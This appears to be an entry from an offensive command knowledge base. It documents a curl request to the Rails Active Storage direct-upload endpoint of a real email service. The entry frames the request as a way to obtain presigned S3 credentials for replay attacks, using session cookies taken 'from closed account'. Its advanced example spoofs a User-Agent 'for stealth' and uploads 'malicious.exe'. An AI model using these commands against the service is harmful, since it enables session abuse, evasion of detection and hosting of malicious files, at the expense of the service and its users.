---
id: cmd-uuid-1
data: >-
  curl -X POST https://app.hey.com/rails/active_storage/direct_uploads -H
  "X-CSRF-Token: <your_CSRF-Token>" -H "Cookie: <your_Cookie>" -H "Content-Type:
  application/json" -d
  '{"blob":{"filename":"<filename>","content_type":"<content_type>","byte_size":338,"checksum":"<checksum>"}}'
tags:
  - http
  - upload
  - rails
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.699Z'
verified: false
validated: true
submitted: true
---
# initiate-active-storage-upload

## Command

```bash
curl -X POST https://app.hey.com/rails/active_storage/direct_uploads \
  -H "X-CSRF-Token: <your_CSRF-Token>" \
  -H "Cookie: <your_Cookie>" \
  -H "Content-Type: application/json" \
  -d '{"blob":{"filename":"<filename>","content_type":"<content_type>","byte_size":338,"checksum":"<checksum>"}}'
```

## Description

Initiates a direct upload in Rails Active Storage by submitting file metadata, generating presigned S3 credentials for replay attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| X-CSRF-Token | CSRF protection token from login | Yes |
| Cookie | Session cookie, e.g., from closed account | Yes |
| filename | Name of file to upload | Yes |
| content_type | MIME type, e.g., image/svg+xml | Yes |
| byte_size | File size in bytes | Yes |
| checksum | Base64 MD5 of file content | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://app.hey.com/rails/active_storage/direct_uploads \
  -H "X-CSRF-Token: abc123" \
  -H "Cookie: session=def456" \
  -H "Content-Type: application/json" \
  -d '{"blob":{"filename":"test.svg","content_type":"image/svg+xml","byte_size":338,"checksum":"O7o+RLY+/uKz4L+..."}}'
```

### Advanced Usage

Include additional headers like User-Agent for stealth:

```bash
curl -X POST https://app.hey.com/rails/active_storage/direct_uploads \
  -H "User-Agent: Mozilla/5.0 ..." \
  -H "X-CSRF-Token: abc123" \
  -H "Cookie: session=def456" \
  -H "Content-Type: application/json" \
  -d '{"blob":{"filename":"malicious.exe","content_type":"application/octet-stream","byte_size":1024,"checksum":"..."}}'
```

## Expected Output

JSON with upload details: {"id":"1","key":"...","signed_id":"...","direct_upload":{"url":"https://s3...","headers":{"X-Amz-...":"..."}}}

## Related

- [[commands/execute-s3-presigned-put]]
- [[procedures/Replay-Modified-POST-for-Upload-Initiation]]
